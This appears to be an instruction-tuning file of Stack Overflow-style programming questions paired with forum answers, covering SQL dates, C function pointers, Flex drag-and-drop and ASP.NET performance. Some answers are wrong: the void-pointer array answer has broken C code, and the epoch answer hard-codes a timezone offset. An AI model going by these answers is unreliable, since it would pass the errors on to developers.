{"instruction": "This is a difficult and open-ended question I know, but I thought I'd throw it to the floor and see if anyone had any interesting suggestions.\nI have developed a code-generator that takes our python interface to our C++ code (generated via SWIG) and generates code needed to expose this as WebServices.  When I developed this code I did it using TDD, but I've found my tests to be brittle as hell.  Because each test essentially wanted to verify that for a given bit of input code (which happens to be a C++ header) I'd get a given bit of outputted code I wrote a small engine that reads test definitions from XML input files and generates test cases from these expectations.\nThe problem is I dread going in to modify the code at all.  That and the fact that the unit tests themselves are a: complex, and b: brittle.\nSo I'm trying to think of alternative approaches to this problem, and it strikes me I'm perhaps tackling it the wrong way.  Maybe I need to focus more on the outcome, IE: does the code I generate actually run and do what I want it to, rather than, does the code look the way I want it to.\nHas anyone got any experiences of something similar to this they would care to share?", "output": "Yes, results are the ONLY thing that matters. The real chore is writing a framework that allows your generated code to run independently... spend your time there."}
{"instruction": "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well?", "output": "If you poke around Apple's mailing lists you can find some code to do it in Java as well. Here's a simple example suitable for capturing individual frames, and here's a more complicated one that's fast enough to display live video."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "This is really a personal opinion on my part (I guess that's redundant since it is a forum). NUnit, MSTest, ect all do pretty mutch the same thing.  However I find NMock indispensable.\nNMock or any mocking package is not unit testing but it makes it so much easier to do unit testing that it mught as well be."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "Stick to NUnit.  Don't go anywhere near MSTest.\nNUnit + ReSharper is an absolute joy to work with."}
{"instruction": "Once I've called DragManager.acceptDrag is there any way to \"unaccept\" the drag? Say that I have a view which can accept drag and drop, but only in certain areas. Once the user drags over one of these areas I call DragManager.acceptDrag(this) (from a DragEvent.DRAG_OVER handler), but if the user then moves out of this area I'd like to change the status of the drag to not accepted and show the DragManager.NONE feedback. However, neither calling DragManager.acceptDrag(null) nor DragManager.showFeedback(DragManager.NONE) seems to have any effect. Once I've accepted the drag an set the feedback type I can't seem to change it.\nJust to make it clear: the areas where the user should be able to drop are not components or even display objects, in fact they are just ranges in the text of a text field (like the selection). Had they been components of their own I could have solved it by making each of them accept drag events individually. I guess I could create proxy components that float over the text to emulate it, but I'd rather not if it isn't necessary.\n\nI've managed to get it working in both AIR and the browser now, but only by putting proxy components on top of the ranges of text where you should be able to drop things. That way I get the right feedback and drops are automatically unaccepted on drag exit.\nThis is the oddest thing about D&D in AIR:\nDragManager.doDrag(initiator, source, event, dragImage, offsetX, offsetY);\n\nIn browser-based Flex, offsetX and offsetY should be negative (so says the documentation, and it works fine). However, when running exactly the same code in AIR you have to make the offsets positive. The same numbers, but positive. That is very, very weird.\n\nI've tested some more and what @maclema works, but not if you run in AIR. It seems like drag and drop in AIR is different. It's really, really weird because not only is the feedback not showing correctly, and it's not possible to unaccept, but the coordinates are also completely off. I just tried my application in a browser instead of AIR and dragging and dropping is completely broken.\nAlso, skipping the dragEnter handler works fine in AIR, but breaks everything when running in a browser.", "output": "Are you using only the dragEnter method? If you are trying to reject the drag while still dragging over the same component you need to use both the dragEnter and dragOver methods.\nCheck out this example:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<mx:Application xmlns:mx=\"http://www.adobe.com/2006/mxml\" layout=\"absolute\">\n    <mx:Script>\n    \t<![CDATA[\n    \t\timport mx.core.DragSource;\n    \t\timport mx.managers.DragManager;\n    \t\timport mx.events.DragEvent;\n\n    \t\tprivate function onDragEnter(e:DragEvent):void {\n    \t\t\tif ( e.target == lbl ) {\n\n    \t\t\t\tif ( e.localX < lbl.width/2 ) {\n    \t\t\t\t\ttrace(\"accept\");\n    \t\t\t\t\tDragManager.acceptDragDrop(this);\n    \t\t\t\t}\n    \t\t\t\telse {\n    \t\t\t\t\tDragManager.acceptDragDrop(null);\n    \t\t\t\t}\n    \t\t\t}\n    \t\t}\n\n    \t\tprivate function doStartDrag(e:MouseEvent):void {\n    \t\t\tif ( e.buttonDown ) {\n    \t\t\t\tvar ds:DragSource = new DragSource();\n    \t\t\t\tds.addData(\"test\", \"text\");\n\n    \t\t\t\tDragManager.doDrag(btn, ds, e);\n    \t\t\t}\n    \t\t}\n    \t]]>\n    </mx:Script>\n    <mx:Label id=\"lbl\" text=\"hello world!\" left=\"10\" top=\"10\" dragEnter=\"onDragEnter(event)\" dragOver=\"onDragEnter(event)\" />\n    <mx:Button id=\"btn\" x=\"47\" y=\"255\" label=\"Button\" mouseMove=\"doStartDrag(event)\"/>\n</mx:Application>"}
{"instruction": "I'm guessing it needs to be something like:\nCONVERT(CHAR(24), lastModified, 101)\n\nHowever I'm not sure of the right value for the third parameter.\nThanks!\n\nWell I'm trying to write a script to copy my sql server db to a sqlite file, which gets downloaded to an air app, which then syncs the data to another sqlite file. I'm having a ton of trouble with dates. If I select a date in air and try to insert it, it fails because it's not in the right format... even if it was a valid date to begin with. I figured I'd try to experiment with the unix time since that's the only thing thats worked so far. I am considering just leaving them as varchar because I don't sort by them anyway.", "output": "Define \"last epoch\". Does this come close?\nSelect Cast(lastModified As Integer)"}
{"instruction": "I'm guessing it needs to be something like:\nCONVERT(CHAR(24), lastModified, 101)\n\nHowever I'm not sure of the right value for the third parameter.\nThanks!\n\nWell I'm trying to write a script to copy my sql server db to a sqlite file, which gets downloaded to an air app, which then syncs the data to another sqlite file. I'm having a ton of trouble with dates. If I select a date in air and try to insert it, it fails because it's not in the right format... even if it was a valid date to begin with. I figured I'd try to experiment with the unix time since that's the only thing thats worked so far. I am considering just leaving them as varchar because I don't sort by them anyway.", "output": "Last epoch is when 1970 GMT?\nSELECT DATEDIFF(s,'19700101 05:00:00:000',lastModified)\n\nSee also Epoch Date"}
{"instruction": "I'm guessing it needs to be something like:\nCONVERT(CHAR(24), lastModified, 101)\n\nHowever I'm not sure of the right value for the third parameter.\nThanks!\n\nWell I'm trying to write a script to copy my sql server db to a sqlite file, which gets downloaded to an air app, which then syncs the data to another sqlite file. I'm having a ton of trouble with dates. If I select a date in air and try to insert it, it fails because it's not in the right format... even if it was a valid date to begin with. I figured I'd try to experiment with the unix time since that's the only thing thats worked so far. I am considering just leaving them as varchar because I don't sort by them anyway.", "output": "If you store them as varchar, store them as YYYYMMDD. That way you CAN sort by them later if you want to."}
{"instruction": "I'm guessing it needs to be something like:\nCONVERT(CHAR(24), lastModified, 101)\n\nHowever I'm not sure of the right value for the third parameter.\nThanks!\n\nWell I'm trying to write a script to copy my sql server db to a sqlite file, which gets downloaded to an air app, which then syncs the data to another sqlite file. I'm having a ton of trouble with dates. If I select a date in air and try to insert it, it fails because it's not in the right format... even if it was a valid date to begin with. I figured I'd try to experiment with the unix time since that's the only thing thats worked so far. I am considering just leaving them as varchar because I don't sort by them anyway.", "output": "SQL server has only 2 failsafe date formats\nISO = YYYYMMDD, run this to see that \n  select convert(varchar(10),getdate(),112)\n\nISO8601 = yyyy-mm-dd Thh:mm:ss:mmm(no spaces) run this to see that \nselect convert(varchar(30),getdate(),126)\n\nTo learn more about how dates are stored in SQL server I wrote How Are Dates Stored In SQL Server?"}
{"instruction": "This is a difficult and open-ended question I know, but I thought I'd throw it to the floor and see if anyone had any interesting suggestions.\nI have developed a code-generator that takes our python interface to our C++ code (generated via SWIG) and generates code needed to expose this as WebServices.  When I developed this code I did it using TDD, but I've found my tests to be brittle as hell.  Because each test essentially wanted to verify that for a given bit of input code (which happens to be a C++ header) I'd get a given bit of outputted code I wrote a small engine that reads test definitions from XML input files and generates test cases from these expectations.\nThe problem is I dread going in to modify the code at all.  That and the fact that the unit tests themselves are a: complex, and b: brittle.\nSo I'm trying to think of alternative approaches to this problem, and it strikes me I'm perhaps tackling it the wrong way.  Maybe I need to focus more on the outcome, IE: does the code I generate actually run and do what I want it to, rather than, does the code look the way I want it to.\nHas anyone got any experiences of something similar to this they would care to share?", "output": "If you are running on *nux you might consider dumping the unittest framework in favor of a bash script or makefile. on windows you might consider building a shell app/function that runs the generator and then uses the code (as another process) and unittest that.\nA third option would be to generate the code and then build an app from it that includes nothing but a unittest. Again you would need a shell script or whatnot to run this for each input. As to how to encode the expected behavior, it occurs to me that it could be done in much the same way as you would for the C++ code just using the generated interface rather than the C++ one."}
{"instruction": "I'm guessing it needs to be something like:\nCONVERT(CHAR(24), lastModified, 101)\n\nHowever I'm not sure of the right value for the third parameter.\nThanks!\n\nWell I'm trying to write a script to copy my sql server db to a sqlite file, which gets downloaded to an air app, which then syncs the data to another sqlite file. I'm having a ton of trouble with dates. If I select a date in air and try to insert it, it fails because it's not in the right format... even if it was a valid date to begin with. I figured I'd try to experiment with the unix time since that's the only thing thats worked so far. I am considering just leaving them as varchar because I don't sort by them anyway.", "output": "I wound up using format 120 in MS SQL: \nconvert(char(24), lastModified, 120)\n\nEach time I needed to a select a date in SQLite for non-display purposes I used:\nstrftime(\\\"%Y-%m-%d %H:%M:%S\\\", dateModified) as dateModified\n\nNow I just need a readable/friendly way to display the date to the user!\nedit: accept answer goes to whoever shows me how to display the date nicely from sqlite ;p"}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "You'd probably need to redefine the function pointer to take additional arguments.\nvoid foreachMove( void (*action)(chess_move*, int), chess_game* game )"}
{"instruction": "How do I page results in SQL Server 2005?\nI tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\nWhat I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\nAny help would be much appreciated.", "output": "If you're trying to get it in one statement (the total plus the paging).  You might need to explore SQL Server support for the partition by clause (windowing functions in ANSI SQL terms).  In Oracle the syntax is just like the example above using row_number(), but I have also added a partition by clause to get the total number of rows included with each row returned in the paging (total rows is 1,262):\nSELECT rn, total_rows, x.OWNER, x.object_name, x.object_type\n  FROM (SELECT COUNT (*) OVER (PARTITION BY owner) AS TOTAL_ROWS,\n               ROW_NUMBER () OVER (ORDER BY 1) AS rn, uo.*\n          FROM all_objects uo\n         WHERE owner = 'CSEIS') x\n WHERE rn BETWEEN 6 AND 10\n\nNote that I have where owner = 'CSEIS' and my partition by is on owner.  So the results are:\nRN  TOTAL_ROWS  OWNER   OBJECT_NAME OBJECT_TYPE\n6   1262    CSEIS   CG$BDS_MODIFICATION_TYPES   TRIGGER\n7   1262    CSEIS   CG$AUS_MODIFICATION_TYPES   TRIGGER\n8   1262    CSEIS   CG$BDR_MODIFICATION_TYPES   TRIGGER\n9   1262    CSEIS   CG$ADS_MODIFICATION_TYPES   TRIGGER\n10  1262    CSEIS   CG$BIS_LANGUAGES    TRIGGER"}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "Ah, if only C supported closures...\nAntonio is right; if you need to pass extra parameters, you'll need to redefine your function pointer to accept the additional arguments. If you don't know exactly what parameters you'll need, then you have at least three choices:\n\nHave the last argument in your prototype be a void*. This gives you flexibility of passing in anything else that you need, but it definitely isn't type-safe.\nUse variadic parameters (...). Given my lack of experience with variadic parameters in C, I'm not sure if you can use this with a function pointer, but this gives even more flexibility than the first solution, albeit still with the lack of type safety.\nUpgrade to C++ and use function objects."}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "If I'm reading this right, what I'd suggest is to make your function take a pointer to a struct as an argument. Then, your struct can have can have \"game\" and \"depth\" when it needs them, and just leave them set to 0 or Null when you don't need them. \nWhat is going on in that function? Do you have a conditional that says, \nif (depth > -1) //some default\n  {\n  //do something\n  }\n\nDoes the function always REQUIRE \"game\" and \"depth\". Then, they should always be arguments, and that can go into your prototypes. \nAre you indicating the function only sometimes requires \"game\" and \"depth\"? Well, maybe make two functions and use each one when you need to. \nBut, having a structure as the argument is probably the easiest thing."}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "If you're willing to use some C++, you can use a \"function object\":\nstruct MoveHandler {\n    chess_game *game;\n    int depth;\n\n    MoveHandler(chess_game *g, int d): game(g), depth(d) {}\n\n    void operator () (chess_move*) {\n         // now you can use the game and the depth\n    }\n};\n\nand turn your foreachMove into a template:\ntemplate <typename T>\nvoid foreachMove(T action, chess_game* game);\n\nand you can call it like this:\nchess_move getNextMove(chess_game* game, int depth){\n    //for each valid move, determine how good the move is\n    foreachMove(MoveHandler(game, depth), game);\n}\n\nbut it won't disrupt your other uses of MoveHandler."}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "I'm probably misremembering, but I\n  thought that Joel's question was about\n  counting the \"on\" bits rather than\n  reversing them.\n\nHere you go:\n#include <stdio.h>\n\nint countBits(unsigned char byte);\n\nint main(){\n  FILE* out = fopen( \"bitcount.c\" ,\"w\");\n\n  int i;\n  fprintf(out, \"#include <stdio.h>\\n#include <stdlib.h>\\n#include <time.h>\\n\\n\");\n\n  fprintf(out, \"int bitcount[256] = {\");\n  for(i=0;i<256;i++){\n    fprintf(out, \"%i\", countBits((unsigned char)i));\n    if( i < 255 ) fprintf(out, \", \");\n  }\n  fprintf(out, \"};\\n\\n\");\n\n  fprintf(out, \"int main(){\\n\");\n\n  fprintf(out, \"srand ( time(NULL) );\\n\");\n  fprintf(out, \"\\tint num = rand() %% 256;\\n\");\n  fprintf(out, \"\\tprintf(\\\"The byte %%i has %%i bits set to ON.\\\\n\\\", num, bitcount[num]);\\n\");\n\n  fprintf(out, \"\\treturn 0;\\n\");\n  fprintf(out, \"}\\n\");\n  fclose(out);\n\n  return 0;\n}\n\nint countBits(unsigned char byte){\n  unsigned char mask = 1;\n  int count = 0;\n  while(mask){\n    if( mask&byte ) count++;\n    mask <<= 1;\n  }\n  return count;\n}"}
{"instruction": "Does SQL Server 2008 ship with the .NET 3.5 CLR, so that stored procedures written in CLR can use 3.5 features?", "output": "Actually it ships with .NET 3.5 SP1.  So yes, the stored procs can use 3.5 features and libraries."}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "I'd suggest using an array of void*, with the last entry always void.\nsay you need 3 parameters you could do this:\nvoid MoveHandler (void** DataArray)\n{\n    // data1 is always chess_move\n    chess_move data1 = DataArray[0]? (*(chess_move*)DataArray[0]) : NULL; \n    // data2 is always float\n    float data1 = DataArray[1]? (*(float*)DataArray[1]) : NULL; \n    // data3 is always char\n    char data1 = DataArray[2]? (*(char*)DataArray[2]) : NULL; \n    //etc\n}\n\nvoid foreachMove( void (*action)(void**), chess_game* game);\n\nand then\nchess_move getNextMove(chess_game* game, int depth){\n    //for each valid move, determine how good the move is\n    void* data[4];\n    data[0] = &chess_move;\n    float f1;\n    char c1;\n    data[1] = &f1;\n    data[2] = &c1;\n    data[3] = NULL;\n    foreachMove(moveHandler, game);\n}\n\nIf all the parameters are the same type then you can avoid the void* array and just send a NULL-terminated array of whatever type you need."}
{"instruction": "This is a difficult and open-ended question I know, but I thought I'd throw it to the floor and see if anyone had any interesting suggestions.\nI have developed a code-generator that takes our python interface to our C++ code (generated via SWIG) and generates code needed to expose this as WebServices.  When I developed this code I did it using TDD, but I've found my tests to be brittle as hell.  Because each test essentially wanted to verify that for a given bit of input code (which happens to be a C++ header) I'd get a given bit of outputted code I wrote a small engine that reads test definitions from XML input files and generates test cases from these expectations.\nThe problem is I dread going in to modify the code at all.  That and the fact that the unit tests themselves are a: complex, and b: brittle.\nSo I'm trying to think of alternative approaches to this problem, and it strikes me I'm perhaps tackling it the wrong way.  Maybe I need to focus more on the outcome, IE: does the code I generate actually run and do what I want it to, rather than, does the code look the way I want it to.\nHas anyone got any experiences of something similar to this they would care to share?", "output": "Recall that \"unit testing\" is only one kind of testing.  You should be able to unit test the internal pieces of your code generator.  What you're really looking at here is system level testing (a.k.a. regression testing).  It's not just semantics... there are different mindsets, approaches, expectations, etc.  It's certainly more work, but you probably need to bite the bullet and set up an end-to-end regression test suite: fixed C++ files -> SWIG interfaces -> python modules -> known output.  You really want to check the known input (fixed C++ code) against expected output (what comes out of the final Python program).  Checking the code generator results directly would be like diffing object files..."}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "Well it is a little bland, but I would vote for Get-Help."}
{"instruction": "Let me try to explain what I need. I have a server that is visible from the internet. What I need is to create a ASP.NET application that get the request of a web Site and send to a internal server, then it gets the response and publish the the info. For the client this should be totally transparent.\nFor different reasons I cannot redirect the port to the internal server. What I can do but no know how - maybe the answer is there - is to create a new Web Site that its host in the other server.", "output": "Why won't any old proxy software work for this?  Why does it need to be an ASP.NET application?  There are TONS of tools out there (both Windows and *nix) that will get the job done quite easily.  Check Squid or NetProxy for starters.\nIf you need to integrate with IIS, IISProxy looks like it would do the trick too."}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "+1 to Antonio.  You need to change your function pointer declaration to accept additional parameters.\nAlso, please don't start passing around void pointers or (especially) arrays of void pointers.  That's just asking for trouble.  If you start passing void pointers, you're going to also have to pass some kind of message to indicate what the pointer type is (or types are).  This technique is rarely appropriate.\nIf your parameters are always the same, just add them to your function pointer arguments (or possibly pack them into a struct and use that as the argument if there are a lot of parameters).  If your parameters change, then consider using multiple function pointers for the multiple call scenarios instead of passing void pointers."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "You could turn on compression based on your client supporting it. See this article: link text"}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "Static resources shouldn't be resent unless changed. IIS will send a response code which tells the browser to use the cached version."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "Script Combining in .net 3.5 SP1\nBest Practices for fast websites\nHTTP Compression (gzip)\nCompress JS / CSS (different than http compression, minify javascript)\n\nYUI Compressor\n.NET YUI Compressor\n\n\nMy best advice is to check out the YUI content. They have some great articles that talk about things like CSS sprites and have some nice javascript libraries to help reduce the number of requests the browser is making."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "Turn viewstate off by default, it will be a night and day difference on even the most simple pages."}
{"instruction": "My license for Whole Tomatoes Visual AssistX is about to expire and I'm not really planning on renewing it.  I use it for spell checking but that's about it.  The refactoring abilities have been a little disappointing.  Before I just jump into Resharper though what are your thoughts on other possible plugins?", "output": "The other major player would be DevExpress and their CodeRush and Refactor products. Found here."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "I think you really need to be able to get some actual PerfMon data/telemetry from the app whilst running in production to be able to make an enlightened decision about what to optimise. \nAs a throw away tip I'd make sure your app is deployed as a Release build and set debug=\"false\" in the 'compilation' section of your web.config."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "If you are using Firefox to test your website, you might want to try a nifty Firefox extension from Yahoo! called YSlow. \nIt analyzes your web pages and provides grades from A-F (A being the Best and F being the worst) for each of the best practices, for high performance websites. It will help you to track down the elements of your website which you could optimize to gain speedups."}
{"instruction": "My license for Whole Tomatoes Visual AssistX is about to expire and I'm not really planning on renewing it.  I use it for spell checking but that's about it.  The refactoring abilities have been a little disappointing.  Before I just jump into Resharper though what are your thoughts on other possible plugins?", "output": "Aside from trying out Visual AssistX, the only other one I've tried is ReSharper (which I highly recommend). If you do decide to go for ReSharper, you'll likely notice that it's missing a spell checker for code though - however the Agent Smith plugin fixes that."}
{"instruction": "Let me try to explain what I need. I have a server that is visible from the internet. What I need is to create a ASP.NET application that get the request of a web Site and send to a internal server, then it gets the response and publish the the info. For the client this should be totally transparent.\nFor different reasons I cannot redirect the port to the internal server. What I can do but no know how - maybe the answer is there - is to create a new Web Site that its host in the other server.", "output": "I use apache modproxy and modproxy_balancer. Works awesome running 5 domains a cluster of 4 web boxes."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "You seem to be starting by assuming that your problem is download size - that may not necessarily be the case. You should do some experimentation with your ASP.NET site to determine if there are areas in your code which are causing undue delays. If it turns out that download size is not your problem, you'll need to find ways to cache your results (look into output caching, which is an ASP.NET feature) or optimize your code.\nIn any case - the first step when looking at a performance issue is always to verify your assumptions first, then decide on a course of action."}
{"instruction": "My license for Whole Tomatoes Visual AssistX is about to expire and I'm not really planning on renewing it.  I use it for spell checking but that's about it.  The refactoring abilities have been a little disappointing.  Before I just jump into Resharper though what are your thoughts on other possible plugins?", "output": "You should take a look at Visual Studio Gallery, the one stop shop for Visual Studio extensions.\nHere you'll find quite a lot of extensions for Visual Studio in all categories, from intellisense and refactoring to designers and documentation builders."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "Have you tried these tips?\nhttp://weblogs.asp.net/haroonwaheed/archive/2008/06/30/ASP.NET-Performance-Tips.aspx"}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "In MS SQL Server Management Studio on the object explorer, right click on the database. In the context menu that follows select 'Tasks -> Take Offline'"}
